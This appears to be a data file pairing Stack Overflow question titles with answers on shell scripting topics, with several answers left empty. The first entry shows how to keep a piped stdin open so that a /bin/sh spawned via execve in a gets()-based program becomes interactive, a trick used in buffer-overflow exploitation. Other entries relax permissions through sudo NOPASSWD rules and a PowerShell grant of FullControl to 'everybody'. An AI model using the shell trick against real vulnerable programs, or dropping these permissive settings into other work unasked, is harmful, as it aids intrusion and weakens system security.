    "execve(\"/bin/sh\", 0, 0); in a pipe": "You can run your program without any modifications like this:\n(echo -e 'testName\\n'; cat ) | ./a.out\nThis way you ensure that your program's standard input doesn't end after what echo outputs. Instead, cat continues to supply input to your program. The source of that subsequent input is your terminal since this is where cat reads from.\nHere's an example session:\nbash-3.2$ cc stdin_shell.c \nbash-3.2$ (echo -e 'testName\\n'; cat ) | ./a.out \nPlease enter your name: warning: this program uses gets(), which is unsafe.\nHello \"testName\"\npwd\n/home/user/stackoverflow/stdin_shell_question\nls -l\ntotal 32\n-rwxr-xr-x  1 user  group  9024 Dec 14 18:53 a.out\n-rw-r--r--  1 user  group   216 Dec 14 18:52 stdin_shell.c\nps -p $$\n  PID TTY           TIME CMD\n93759 ttys000    0:00.01 (sh)\nexit\n\nbash-3.2$\nNote that because shell's standard input is not connected to a terminal, sh thinks it is not executed interactively and hence does not display the prompt. You can type your commands normally, though.",
    "can xargs separate parameters?": "For those who find this from a search, the accepted answer did not work for me.\necho \"'param 1' 'param 2'\" | xargs -n1 | xargs -I@ echo \\[@\\] \\[@\\]\nproduces:\n[param 1] [param 1]\n[param 2] [param 2]\nwhich does not meet the requirements given by the original poster to have xargs read in multiple entities, separate them, and send them to a single command (\"echo\" in the OP) as separate parameters. Xargs is not designed for this sort of task!\n\nThe bash answer can work.\np=(`echo \"param1 param2\"`); echo [${p[0]}] [${p[1]}]\nproduces:\n[param1] [param2]\nbut this solution does not work with more than one line.\n\nA correct solution with bash for sending pairs of lines as arguments to a single command is:\n(echo 'param 1'; echo 'param 2'; echo 'param 3'; echo 'param 4') | while read line1; read line2; do echo \"[$line1] [$line2]\"; done\nproduces:\n[param 1] [param 2]\n[param 3] [param 4]\n\nThe GNU Parallel answer does work, but GNU Parallel must be make'd and installed. (The version packaged with Ubuntu is not GNU Parallel.)",
    "find in directory that starts with dash": "This may seem a bit cheap, but I actually recommend the readlink workaround that you've figured out. According to the Unix standard,\nThe first argument that starts with a '-' (...) and all subsequent arguments shall be interpreted as an expression\nso -- will indeed not work. thkala's solution may also work, but I find it less readable. It may be faster though, if you're doing a lot of find invocations.",
    "How to run script commands from variables?": "You're demonstrating the difference between the shell and the kernel.\n\"ls -l\" is executable by the system execve() call. You can man execve for details, but that's probably too much detail for you.\n\"ls -l | grep e\" needs shell interpretation to set up the pipe. Without using a shell, the '|' character is just passed into execve() as an argument to ls. This is why you see the \"No such file or directory\" errors.\nSolution:\ncmd=\"ls -l | grep e\"\nbash -c \"$cmd\"",
    "Retrieving the First Non-Option Command Line Argument": "Using getopt is probably the way to go.\nIf you wanted to see argument scanning code in bash, the non-getopt way is:\nrealargs=\"$@\"\nwhile [ $# -gt 0 ]; do\n    case \"$1\" in\n      -x | -y | -z)\n        echo recognized one argument option $1 with arg $2\n        shift\n        ;;\n      -a | -b | -c)\n        echo recognized zero argument option $1, no extra shift\n        ;;\n      *)\n        saveme=$1\n        break 2\n        ;;\n    esac\n    shift\ndone\nset -- $realargs\necho saved word: $saveme\necho run real command: \"$@\"",
    "How to escape & in scp": "Escaping both the spaces and the ampersand did the trick for me :\nscp source_file \"user@host:/dir\\ with\\ spaces\\ \\&\\ ampersand\"\nThe quotes are still needed for some reason.",
    "How to \"hide\" an executable from a bash script?": "You can use the builtin command, hash:\nhash [-r] [-p filename] [-dt] [name]\nEach time hash is invoked, it remembers the full pathnames of the commands specified as name arguments, so they need not be searched for on subsequent invocations. ... The -p option inhibits the path search, and filename is used as the location of name. ... The -d option causes the shell to forget the remembered location of each name.\nBy passing a non-existent file to the -p option, it will be as if the command can't be found (although it can still be accessed by the full path). Passing -d undoes the effect.\n$ hash -p /dev/null/git git\n$ git --version\nbash: /dev/null/git: command not found\n$ /usr/bin/git --version\ngit version 1.9.5\n$ hash -d git\n$ git --version\ngit version 1.9.5",
    "Bash script to remove all files and directories except specific ones": "Two problems I can see right off the bat:\nThe -rf argument to rm must come before the filenames\nThe extglob specifiers !, (, | and ) should not be escaped with backslashes\nTry this instead:\nrm -rf !(filename1|filename2|filename3)\nIf it's still not working, remove the -f argument, and you'll get error messages about what's going wrong instead of silently suppressing them. To print out the name of each file removed, you can add the -v option as well.",
    "Shell script calls sudo; how do I suppress the password prompt": "Most definitely, if you don't mind making that particular command 'free for use' for that particular user:\nSee basically my other answer here: Shell script - Sudo-permissions lost over time\nThe simplest thing that may work is\nmyuser = NOPASSWD: /sbin/ifconfig\nAlso, you could sudo an arbitrary command on the same terminal (tty/vty), and sudo will cache the authentication for a while (or until sudo -k), so you may start the script and it will 'remember' the credentials from your earlier sudo invocation. I sometimes do this when composing pipes with sudo (just preceded them with sudo true)",
    "why is the line #!/bin/ksh is the first line in a shell script": "This line tells the operating system what interpreter to invoke to run the script.\nWithout it, there's no way to know that this script needs to be run using the ksh interpreter.\nThe sequence is known as a \"shebang\", and you can read more about it on Wikipedia.",
    "Getting Bad substitution error with a Shell Script on a mac?": "The ,, operator was introduced in bash 4.0, but /bin/bash on macOS is still version 3.2. You can install a newer version of bash and change your shebang accordingly, or you can use letter1=$(echo \"$1\" | tr '[:upper:]' '[:lower:]' | cut -b1) instead.\n(You can, however, use ${letter:0:1}, ${letter:1:1}, etc, in place of a call to cut to get a single letter from the string.)\nMy advice is to treat /bin/bash on macOS as nothing more than a POSIX-compatible shell. Use #!/bin/sh if you want a portable script, or use #!/usr/local/bin/bash (or whatever is appropriate, after installing a new version of bash) if you want to take advantage of bash extensions at the expense of portability.",
    "Pass multiple arrays as arguments to a Bash script?": "The shell passes a single argument vector (that is to say, a simple C array of strings) off to a program being run. This is an OS-level limitation: There exists no method to pass structured data between two programs (any two programs, written in any language!) in an argument list, except by encoding that structure in the contents of the members of this array of C strings.\nApproach: Length Prefixes\nIf efficiency is a goal (both in terms of ease-of-parsing and amount of space used out of the ARG_MAX limit on command-line and environment storage), one approach to consider is prefixing each array with an argument describing its length.\nBy providing length arguments, however, you can indicate which sections of that argument list are supposed to be part of a given array:\n./myScript \\\n  \"${#array1[@]}\" \"${array1[@]}\" \\\n  \"${#array2[@]}\" \"${array2[@]}\" \\\n  \"${#array3[@]}\" \"${array3[@]}\"\n...then, inside the script, you can use the length arguments to split content back into arrays:\n#!/usr/bin/env bash\n\narray1=( \"${@:2:$1}\" ); shift \"$(( $1 + 1 ))\"\narray2=( \"${@:2:$1}\" ); shift \"$(( $1 + 1 ))\"\narray3=( \"${@:2:$1}\" ); shift \"$(( $1 + 1 ))\"\n\ndeclare -p array1 array2 array3\nIf run as ./myScript 3 a b c 2 X Y 1 z, this has the output:\ndeclare -a array1='([0]=\"a\" [1]=\"b\" [2]=\"c\")'\ndeclare -a array2='([0]=\"X\" [1]=\"Y\")'\ndeclare -a array3='([0]=\"z\")'\nApproach: Per-Argument Array Name Prefixes\nIncidentally, a practice common in the Python world (particularly with users of the argparse library) is to allow an argument to be passed more than once to amend to a given array. In shell, this would look like:\n./myScript \\\n  \"${array1[@]/#/--array1=}\" \\\n  \"${array2[@]/#/--array2=}\" \\\n  \"${array3[@]/#/--array3=}\"\nand then the code to parse it might look like:\n#!/usr/bin/env bash\ndeclare -a args array1 array2 array3\nwhile (( $# )); do\n  case $1 in\n    --array1=*) array1+=( \"${1#*=}\" );;\n    --array2=*) array2+=( \"${1#*=}\" );;\n    --array3=*) array3+=( \"${1#*=}\" );;\n    *)          args+=( \"$1\" );;\n  esac\n  shift\ndone\nThus, if your original value were array1=( one two three ) array2=( aye bee ) array3=( \"hello world\" ), the calling convention would be:\n./myScript --array1=one --array1=two --array1=three \\\n           --array2=aye --array2=bee \\\n           --array3=\"hello world\"\nApproach: NUL-Delimited Streams\nAnother approach is to pass a filename for each array from which a NUL-delimited list of its contents can be read. One chief advantage of this approach is that the size of array contents does not count against ARG_MAX, the OS-enforced command-line length limit. Moreover, with an operating system where such is available, the below does not create real on-disk files but instead creates /dev/fd-style links to FIFOs written to by subshells writing the contents of each array.\n./myScript \\\n  <( (( ${#array1[@]} )) && printf '%s\\0' \"${array1[@]}\") \\\n  <( (( ${#array2[@]} )) && printf '%s\\0' \"${array2[@]}\") \\\n  <( (( ${#array3[@]} )) && printf '%s\\0' \"${array3[@]}\")\n...and, to read (with bash 4.4 or newer, providing mapfile -d):\n#!/usr/bin/env bash\nmapfile -d '' array1 <\"$1\"\nmapfile -d '' array2 <\"$2\"\nmapfile -d '' array3 <\"$3\"\n...or, to support older bash releases:\n#!/usr/bin/env bash\ndeclare -a array1 array2 array3\nwhile IFS= read -r -d '' entry; do array1+=( \"$entry\" ); done <\"$1\"\nwhile IFS= read -r -d '' entry; do array2+=( \"$entry\" ); done <\"$2\"\nwhile IFS= read -r -d '' entry; do array3+=( \"$entry\" ); done <\"$3\"",
    "how to set an expect variable with output of shell command": "Single quotes are not quoting mechanism for Tcl, so brace your awk expressions.\n% set b [exec cat /home/a | grep \"work\" | awk -F {=} {{print $2}}]\n10.20.10.1\nReference : Frequently Made Mistakes in Tcl",
    "How can I source a shell script using Go?": "You can set environmental variables when running a program using exec:\ncmd := exec.Command(\"whatever\")\ncmd.Env = []string{\"A=B\"}\ncmd.Run()\nIf you really need source then you can run your command through bash:\ncmd := exec.Command(\"bash\", \"-c\", \"source \" + file.Name() + \" ; echo 'hi'\")\ncmd.Run()\nCheck out this library for a more full-featured workflow: https://github.com/progrium/go-basher.\nUpdate: Here's an example that modifies the current environment:\npackage main\n\nimport (\n    \"bufio\"\n    \"bytes\"\n    \"io/ioutil\"\n    \"log\"\n    \"os\"\n    \"os/exec\"\n    \"strings\"\n)\n\nfunc main() {\n    err := ioutil.WriteFile(\"example_source\", []byte(\"export FOO=bar; echo $FOO\"), 0777)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    cmd := exec.Command(\"bash\", \"-c\", \"source example_source ; echo '<<<ENVIRONMENT>>>' ; env\")\n    bs, err := cmd.CombinedOutput()\n    if err != nil {\n        log.Fatalln(err)\n    }\n    s := bufio.NewScanner(bytes.NewReader(bs))\n    start := false\n    for s.Scan() {\n        if s.Text() == \"<<<ENVIRONMENT>>>\" {\n            start = true\n        } else if start {\n            kv := strings.SplitN(s.Text(), \"=\", 2)\n            if len(kv) == 2 {\n                os.Setenv(kv[0], kv[1])\n            }\n        }\n    }\n}\n\nlog.Println(os.Getenv(\"FOO\"))",
    "Shell script print line number when it errors out": "Using\nPS4=':$LINENO+'\nwill add line number to the output of set -x.\nIf you only want to print that on errors, there's some risk of running into bugs in recent interpreters. However, you can try the following (first given in this previous answer):\nerror() {\n  local parent_lineno=\"$1\"\n  local message=\"$2\"\n  local code=\"${3:-1}\"\n  if [[ -n \"$message\" ]] ; then\n    echo \"Error on or near line ${parent_lineno}: ${message}; exiting with status ${code}\"\n  else\n    echo \"Error on or near line ${parent_lineno}; exiting with status ${code}\"\n  fi\n  exit \"${code}\"\n}\ntrap 'error ${LINENO}' ERR\nAgain, this will not work on some recent builds of bash, which don't always have LINENO set correctly inside traps.\nAnother approach (which will only work on recent shells; the below uses some bash 4.0 and 4.1 features) is to use PS4 to emit the exit status and line number of each command to a dedicated file descriptor, and use tail to print only the last line given to that FD before the shell exits:\nexec {BASH_XTRACEFD}> >(tail -n 1) # send set -x output to tail -n 1\nPS4=':At line $LINENO; prior command exit status $?+'\nset -x",
    "Change directory in fish function and return to original directory after abort": "This is as close as I can get to a subshell:\nfunction omake\n    echo \"cd $SOURCE_ROOT; and make \\$argv\" | fish /dev/stdin $argv\nend\nProcess substitution does not seem to be interruptable: Ctrl-C does not stop this sleep cmd\necho (cd /tmp; and sleep 15)\nHowever, fish has a very nice way to find the pid of a backgrounded process:\nfunction omake\n    pushd dir1\n    make $argv &\n    popd\nend\nThen, to stop the make, instead of Ctrl-C, do kill %make",
    "Getting the current shell type from python script": "Sorry to bring this back from the dead but I just did this myself. The following should give you the path to your current shell:\nfrom os import environ\nprint(environ['SHELL'])\nYou should be able to replace shell with any environment variable you're looking for.",
    "MongoDB shell: reading a line from the console": "Per @Stennie's comment, this is not possible right now.",
    "Bash, execute command but continue with interactive session": "My advice would be using a custom bashrc file with --rcfile that sources your .bashrc, ex :\nalias admin=pagsh -c \"bash --rcfile myrc\"\nmyrc :\nsource ~/.bashrc\nkinit xtoth1@ADMIN.META",
    "Passing a command with arguments as a string to docker run": "Start with the syntax of the docker run command, which is:\ndocker run [OPTIONS] IMAGE[:TAG|@DIGEST] [COMMAND] [ARG...]\nThis means if you run:\nDOCKER_COMMAND='bash -c \"(cd build && make)\"'\ndocker run --rm -it myImage \"$DOCKER_COMMAND\"\nYou are passing the entirety of the $DOCKER_COMMAND variable as the COMMAND. You are asking Docker to find a file matching the name bash -c \"(cd build && make)\", so it should be no surprise that it fails. It doesn't have anything to do with \"docker run doesn't understand the substitution\". This is all related to the way your shell parses command lines before executing them.\nWhen you remove the quotes around $DOCKER_COMMAND, you end up calling it like this (I'm putting each argument on a separate line to make it obvious):\ndocker\nrun\n--rm\n-it\nmyImage\nbash\n-c\n\"(cd\nbuild\n&&\nmake)\"\nAnd that's not going to work, because bash is going to try to run the script \"(cd, which should make obvious the reason for the unexpected EOF while looking for matching\"'error.  Bash's-c` option only takes a single argument, but because of the way shell expansion works it's getting 4.\nYou could do it this way:\nDOCKER_COMMAND='cd build && make'\ndocker run --rm -it myImage bash -c \"$DOCKER_COMMAND\"\n(I've removed the parentheses around your command because they don't do anything the way you're using them.)\nThis way, you're calling docker run with a command of bash, and you're giving bash's -c option a single argument (the contents of the $DOCKER_COMMAND variable).",
    "Open spyder in ubuntu": "If typing \"spyder\" doesn't work, you might want to try typing \"spyder3\" in case you installed the spyder3 version. Below is what worked for me in my Ubuntu system.\nTo install spyder via pip (my python version is 3.6.2), I used:\n pip install spyder\nThen, I had to install another package:\n pip install PyQtWebEngine\nFinally, to open the Spyder window, I typed into my terminal:\n spyder3",
    "Possible to change tab completion behavior in fish shell?": "I commend you for writing up this detailed and thoughtful post, and it deserves an equally detailed and thoughtful response!\nThe tab completion behavior has been rewritten in fish top-of-tree (not yet released), and is referred to as the \"new pager.\" You can see the design goals and discussion here. I put a note at the bottom of this reply for how to get it.\nShells are personal, and like anything personal, rationalizations and justifications aren't worth anything: you either like it, or you don't, and we may not even be conscious of the factors influencing our feelings. So all I can really say is try it, see how you feel, and (please) report back.\nI put up a short little screencast of the new pager on YouTube. Things to notice: 1. the menu is dismissed just by typing more, 2. it \"unfurls\" progressively (requires a few tabs to become fully visible), never modally takes over your screen even when there's a huge number of completions, and is easily searchable and navigable, and 3. escape will always dismiss it and put your command line back to just what you typed.\nLet me go through your concerns individually:\n\"I have to hit tab an unknown number of times to get the value I wanted\". With the new pager, the selected item is highlighted in the menu. This sounds minor, but personally I believe this makes a huge difference: the number of additional times to hit tab becomes known, and since your finger is over tab, it's often easier to just hit it a few more times than to type additional letters. You can also use the arrow keys to navigate.\n\"I have no way of getting the entry context back to only the letters that I've actually typed up to this point\". With the new pager, the escape key does exactly that. It's easy to press since escape is right above tab, where your finger is.\n\"What if there happen to be a whole bunch of things that start with ba in this directory -- I'm totally screwed is what happens\". Neither bash nor old-pager-fish handles large numbers of completions well. fish would drop you into this modal paging environment, while bash breaks your flow with the modal \"Display all 1002 possibilities? (y or n)\" dialog that forces you to stop what you're doing and hit 'n'.\nI think you'll love how the new pager handles this. Initially you get a short menu, that fills a maximum of five lines below your prompt (not above, and not replacing). This menu is non-modal, and is dismissed by typing more or hitting escape. If you hit tab again, the menu grows to show more completions, but is still non-modal. There's never a jarring transition.\n\"it does not allow using tab to complete nested paths\" Sorry, I'm not sure what you mean by this. Both bash and fish append a / when tab completing a directory.\n\"much more difficult to discover disambiguation sequences when in large directories\" With the new pager, you can hit escape, type some more, and then tab again. Or you can search the menu: put the focus in the menu and type something, and it's filtered. See the screencast above.\n\"in general requires you to 'be careful' before you hit tab which makes you hit it less often and decreases its utility\" A very valid point, which the new pager addresses in a few ways. First of all, it uses a notion of progressive disclosure, which means that it takes \"work\" to output a lot of data. Second, it never \"takes over your screen\" like the old modal pager. And lastly, you can hit escape to get back to just what you typed, and since the pager appears below the prompt, it won't leave little turds in your scrollback like bash does.\nIf you're using homebrew, you can install from master via brew install fish --HEAD. There's also nightly builds for Linux. And lastly, feel free to open an issue at https://github.com/fish-shell/fish-shell/issues with any ideas for improvements you have.",
    "Popen.communicate() returns (None, None) even if script print results": "From the docs:\nNote that if you want to send data to the process\u2019s stdin, you need to create the Popen object with stdin=PIPE. Similarly, to get anything other than None in the result tuple, you need to give stdout=PIPE and/or stderr=PIPE too.\nHence, create the Popen object with:\nsubprocess.Popen(\"./myscript arg1 arg2\", shell=True,\n                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
    "Cat with heredoc does not work in zsh shell": "Here is another way to write it:\ncat <<eos > filename\nfoo bar baz\neos\nThat works in zsh.",
    "Shell script start 1 session with multiple windows": "The command you can send with -X option is not shell command but screen command.\nCheck CUSTOMIZATION section in man screen to see the list of screen command. the following code uses screen command to create new window and stuff command to show text on the window.\n#!/bin/bash\nscreen -d -m -S mysession\n# window 0 is created by default, show hello0 on it\nscreen -S mysession -p 0 -X stuff hello0\nfor n in {1..9}; do\n  # create now window using `screen` command\n  screen -S mysession -X screen $n\n  screen -S mysession -p $n -X stuff hello$n\ndone\nNow you can attach to myscreen session and check that there are 10 windows and hello0 .. hello9 is displayed in each window.\n$ screen -r mysession\n[Press C-a \"]",
    "How to execute a php script from another php script by using the shell?": "",
    "How to execute unix commands through Windows/cygwin using Java": "1. Calling unix commands:\nYou simply need to call your unix shell (e.g. the bash delivered with cygwin) instead of cmd.\nbash -c \"ls -la\"\nshould do. Of course, if your command is an external program, you could simply call it directly:\nls -la\nWhen starting this from Java, it is best to use the variant which takes a string array, as then you don't have Java let it parse to see where the arguments start and stop:\nProcess p = \n     Runtime.getRuntime().exec(new String[]{\"C:\\\\cygwin\\\\bin\\\\bash.exe\",\n                                            \"-c\", \"ls -la\"},\n                               new String[]{\"PATH=/cygdrive/c/cygwin/bin\"});\nThe error message in your example (ls: command not found) seems to show that your bash can't find the ls command. Maybe you need to put it into the PATH variable (see above for a way to do this from Java).\nMaybe instead of /cygdrive/c/cygwin/bin, the right directory name would be /usr/bin.\n(Everything is a bit complicated here by having to bridge between Unix and Windows conventions everywhere.)\nThe simple ls command can be called like this:\nProcess p = Runtime.getRuntime().exec(new String[]{\"C:\\\\cygwin\\\\bin\\\\ls.exe\", \"-la\"});\n2. Invoking multiple commands:\nThere are basically two ways of invoking multiple commands in one shell:\npassing them all at once to the shell; or\npassing them interactively to the shell.\nFor the first way, simply give multiple commands as argument to the -c option, separated by ; or \\n (a newline), like this:\nbash -c \"cd /bin/ ; ls -la\"\nor from Java (adapting the example above):\nProcess p = \n     Runtime.getRuntime().exec(new String[]{\"C:\\\\cygwin\\\\bin\\\\bash.exe\",\n                                            \"-c\", \"cd /bin/; ls -la\"},\n                               new String[]{\"PATH=/cygdrive/c/cygwin/bin\"});\nHere the shell will parse the command line as, and execute it as a script. If it contains multiple commands, they will all be executed, if the shell does not somehow exit before for some reason (like an exit command). (I'm not sure if the Windows cmd does work in a similar way. Please test and report.)\nInstead of passing the bash (or cmd or whatever shell you are using) the commands on the command line, you can pass them via the Process' input stream.\nA shell started in \"input mode\" (e.g. one which got neither the -c option nor a shell script file argument) will read input from the stream, and interpret the first line as a command (or several ones).\nThen it will execute this command. The command itself might read more input from the stream, if it wants.\nThen the shell will read the next line, interpret it as a command, and execute.\n(In some cases the shell has to read more than one line, for example for long strings or composed commands like if or loops.)\nThis will go on until either the end of the stream (e.g. stream.close() at your side) or executing an explicit exit command (or some other reasons to exit).\nHere would be an example for this:\nProcess p = Runtime.getRuntime().exec(new String[]{\"C:\\\\cygwin\\\\bin\\\\bash.exe\", \"-s\"});\nInputStream outStream = p.getInputStream(); // normal output of the shell\nInputStream errStream = p.getInputStream(); // error output of the shell\n// TODO: start separate threads to read these streams\n\nPrintStream ps = new PrintStream(p.getOutputStream());\nps.println(\"cd /bin/\");\nps.println(\"ls -la\");\nps.println(\"exit\");\nps.close();",
    "tilde expansion in environment variable": "use\nSOME_PATH=~/path/to/path/\nif you path have spaces, quote it\nSOME_PATH=~/\"path with spaces\"",
    "How to return stdout and stderr together with the status from a Jenkins Pipeline sh script step": "",
    "Run a UEFI shell command from inside UEFI application": "Calling a UEFI shell command from a UEFI application can be done using the EFI_SHELL_EXECUTE function of EFI_SHELL_PROTOCOL, defined under MdePkg/Include/Protocol/Shell.h.\nYou need to include the protocol GUID in the inf file of your UEFI application:\n[Protocols]\n  gEfiShellProtocolGuid                  ## CONSUMES\nThen you can call a shell command like in the following example:\nEFI_STATUS\nEFIAPI\nUefiMain (\n  IN EFI_HANDLE                            ImageHandle,\n  IN EFI_SYSTEM_TABLE                      *SystemTable\n  )\n{\n  EFI_SHELL_PROTOCOL    *EfiShellProtocol;\n  EFI_STATUS            Status;\n\n  Status = gBS->LocateProtocol (&gEfiShellProtocolGuid,\n                                NULL,\n                                (VOID **) &EfiShellProtocol);\n\n  if (EFI_ERROR (Status)) {\n    return Status; \n  }\n\n  EfiShellProtocol->Execute (&ImageHandle,\n                             L\"echo Hello World!\",\n                             NULL,\n                             &Status);\n\n  return Status;\n}\nEDIT: There's an easier (and probably a more correct) way of doing it using ShellLib Library Class:\n#include <Library/ShellLib.h>\n\nEFI_STATUS\nEFIAPI\nUefiMain (\n  IN EFI_HANDLE                            ImageHandle,\n  IN EFI_SYSTEM_TABLE                      *SystemTable\n  )\n{\n  EFI_STATUS            Status;\n\n  ShellExecute (&ImageHandle,\n                L\"echo Hello World!\",\n                FALSE,\n                NULL,\n                &Status);\n\n  return Status;\n}",
    "run composer and laravel (artisan) commands without ssh access": "",
    "grep -f file to print in order as a file": "You can pipe patt.grep to xargs, which will pass the patterns to grep one at a time.\nBy default xargs appends arguments at the end of the command. But in this case, grep needs myfile.log to be the last argument. So use the -I{} option to tell xargs to replace {} with the arguments.\ncat patt.grep | xargs -Ihello grep hello myfile.log",
    "Remove trailing newline from esyscmd in m4": "devnull's example is good but, M4 has a builtin tr as well. Here's what I'm doing:\ndefine(CMD_OUTPUT, esyscmd(`sass --style=compressed foo.sass'))\ndefine(NL,`\n')\ntranslit(CMD_OUTPUT, NL)\nSomeone a little better with M4 could tighten that into a single macro.",
    "chmod function for PowerShell": "Here is an example with the native way, using ACL and ACE. You have to build your own functions arround that.\n# Get the Access Control List from the file\n# Be careful $acl is more a security descriptor with more information than ACL\n$acl = Get-Acl \"c:\\temp\\test.txt\"\n\n\n# Show here how to refer to useful enumerate values (see MSDN)\n$Right = [System.Security.AccessControl.FileSystemRights]::FullControl\n$Control = [System.Security.AccessControl.AccessControlType]::Allow\n\n# Build the Access Control Entry ACE \n# Be careful you need to replace \"everybody\" by the user or group you want to add rights to\n$ace = New-Object System.Security.AccessControl.FileSystemAccessRule (\"everybody\", $Right, $Control)\n\n# Add ACE to ACL\n$acl.AddAccessRule($ace)\n\n# Put ACL to the file\nSet-Acl \"c:\\temp\\test.txt\" $acl\n(Get-Acl \"c:\\temp\\test.txt\").access\nRead-Host \"--------- Test Here --------------\"\n\n# Remove ACE from ACL\n$acl.RemoveAccessRule($ace)\nSet-Acl \"c:\\temp\\test.txt\" $acl\n(Get-Acl \"c:\\temp\\test.txt\").access",
    "How to fix shebang flags that are not recognized on some systems": "Some systems do not allow multiple arguments on a #!-style line. The \"env hack\" is not an officially recommended way of solving the path problem in any case - the preferred way to deal with this is to have the install rewrite the #! line to refer to /bin/python, /usr/bin/python, as appropriate for the system.\nhttp://pubs.opengroup.org/onlinepubs/009695399/utilities/sh.html",
    "Emacs... as your default shell?": "emacs -f eshell\nEDIT: If you don't want to start a new emacs you can use emacsclient.\nemacsclient -e '(eshell)'\nMake sure you have started the server the best way to do it is to add (server-start) in your . emacs",
    "Bash script to (more or less) reliably check if the Internet is up": "That one seems like a good solution. Just add a few more hosts, and maybe some pure IP hosts so you don't rely on DNS functioning (which in itself depends on your definition of \"up\").",
    "shell matching a pattern using a case-statement which is stored inside a variable": "It is possible to match a sub-string in a string without spawning a sub-process (such as grep) using the only POSIX compliant methods of sh(1p), as defined in Section 2.6.2, Parameter Expansion.\nHere is a convenience function:\n# Note:\n# Unlike a regular expression, the separator *must* enclose the pattern;\n# and it could be a multi chars.\n\nisin() {\n    PATTERN=${2:?a pattern is required}\n    SEP=${3:-|}\n    [ -z \"${PATTERN##*${SEP}${1}${SEP}*}\" ]\n}\nExamples:\nfor needle in foo bar; do\n    isin \"$needle\" \"|hello|world|foo|\" && echo \"found: $needle\"\ndone\n\n# using \";\" as separator\nfor needle in foo bar; do\n    isin \"$needle\" \";hello;world;foo;\" \\; && echo \"found: $needle\"\ndone\n\n# using the string \"RS\" as separator\nfor needle in foo bar; do\n    isin \"$needle\" \"RShelloRSworldRSfooRS\" RS && echo \"found: $needle\"\ndone\nYou can mix this solution with the case statement if you want both of the worlds:\nPATTERN=\"|foo bar|baz|bla|\"\n\ncase \"$needle\" in\n    xyz) echo \"matched in a static part\" ;;\n    *)\n        if [ -z \"${PATTERN##*|${needle}|*}\" ]; then\n            echo \"$needle matched $PATTERN\"\n        else\n            echo \"not found\"\n        fi\nesac\nNote\nSometimes it is good to remember you could do your whole script in awk(1p), which is also POSIX, but I believe this is for another answer.",
    "Does renice on a parent renice the child?": "Children inherit the current priority of a process when they're created. That means, if you renice the parent and start a child, it will have the modified priority.\nChildren that are already running when you renice are not affected.\nThe clue is in the fork() man pages (starting a child is a fork/exec operation):\nfork() creates a child process that differs from the parent process only in its PID and PPID, and in the fact that resource utilizations are set to 0.",
    "How to pass a PHP array to a BASH script?": "",
    "How to implement Ctrl-C and Ctrl-D with openpty?": "I stepped through st (the suckless terminal, whose code is actually small and simple enough to understand) in gdb on Linux to find that when you press Ctrl-C and Ctrl-D, it writes \\003 and \\004 to the process, respectively. I tried this on OS X in my project and it worked just as well.\nSo in the context of my code above, the solution for handling each of the hotkeys is this:\nCtrl-C: [masterHandle writeData:[NSData dataWithBytes:\"\\003\" length:1]];\nCtrl-D: [masterHandle writeData:[NSData dataWithBytes:\"\\004\" length:1]];",
    "Execute perl in PHP [duplicate]": "",
    "How to determine if a shell script file is sourced in Bash [duplicate]": "It doesn't work if sourced by another script. I would go the other way around;\ntest \"X$(basename -- \"$0\")\" = \"Xbuild.sh\" || echo Being sourced\nUpdate: added X prefix to both strings.\nUpdate too: added double dash to basename invocation.",
    "symbolic link without expanding $HOME or \"~\"?": "tl,dr it won't work\nYou can use an escaping mechanism such as single-quotes to get the ~ into the symbolic link:\n> cd ~\n> echo hello > a    \n> ln -s '~/a' b\nHowever, ~ is a shell expansion and is not understood by the filesystem (actually, to the filesystem it's \"just another character\"). This is a good thing -- want the file-system layer to know about environment variables, as ~ is generally determined by $HOME?\n> ls -l b\nlrwxrwxrwx    1 root     root             3 Oct 27 17:39 b -> ~/a\n> ls b\nls: b: No such file or directory \nYou could still \"manually\" look at said symbolic link entries (as done with ls -l), but that would have to be done in a non-transparent fashion by a program (think of a \".LNK\" in Windows). As can be seen, the filesystem just doesn't understand ~.\nHappy sh'ing.",
    "Can I use Fabric to perform interactive shell commands?": "This is in Fabric 1.0. I've tried it and it works for me.\nOlder versions of Fabric (and similar high level SSH libraries) run remote programs in limbo, unable to be touched from the local end. This is problematic when you have a serious need to enter passwords or otherwise interact with the remote program.\nFabric 1.0 and later breaks down this wall and ensures you can always talk to the other side.\nSource\nEdit: As payne notes below, Fabric 1.0 was released. I edited the answer to indicate this.",
    "bash: getting percentage from a frequency table": "Try this (with the sort moved to the end:\ncut -f $1 $2| sort | uniq -c  | awk '{array[$2]=$1; sum+=$1} END { for (i in array) printf \"%-20s %-15d %6.2f%%\\n\", i, array[i], array[i]/sum*100}' | sort -r -k2,2 -n",
    "Recursively search for files of a given name, and find instances of a particular phrase AND display the path to that file": "try this:\nfind -name \"index.yml\" -exec grep -i -H -C4 pattern {} \\;\nnote: not actually tested under msys.",
    "Bash 'swallowing' sub-shell children process when executing a single command": "There's actually a comment in the bash source that describes much of the rationale for this feature:\n/* If this is a simple command, tell execute_disk_command that it\n   might be able to get away without forking and simply exec.\n   This means things like ( sleep 10 ) will only cause one fork.\n   If we're timing the command or inverting its return value, however,\n   we cannot do this optimization. */\nif ((user_subshell || user_coproc) && (tcom->type == cm_simple || tcom->type == cm_subshell) &&\n    ((tcom->flags & CMD_TIME_PIPELINE) == 0) &&\n    ((tcom->flags & CMD_INVERT_RETURN) == 0))\n  {\n    tcom->flags |= CMD_NO_FORK;\n    if (tcom->type == cm_simple)\n      tcom->value.Simple->flags |= CMD_NO_FORK;\n  }\nIn the bash -c '...' case, the CMD_NO_FORK flag is set when determined by the should_suppress_fork function in builtins/evalstring.c.\nIt is always to your benefit to let the shell do this. It only happens when:\nInput is from a hardcoded string, and the shell is at the last command in that string.\nThere are no further commands, traps, hooks, etc. to be run after the command is complete.\nThe exit status does not need to be inverted or otherwise modified.\nNo redirections need to be backed out.\nThis saves memory, causes the startup time of the process to be slightly faster (since it doesn't need to be forked), and ensures that signals delivered to your PID go direct to the process you're running, making it possible for the parent of sh -c 'sleep 10' to determine exactly which signal killed sleep, should it in fact be killed by a signal.\nHowever, if for some reason you want to inhibit it, you need but set a trap -- any trap will do:\n# run the noop command (:) at exit\nbash -c 'trap : EXIT; sleep 10'",
    "What does CircleCI do with non-0 exit codes?": "",
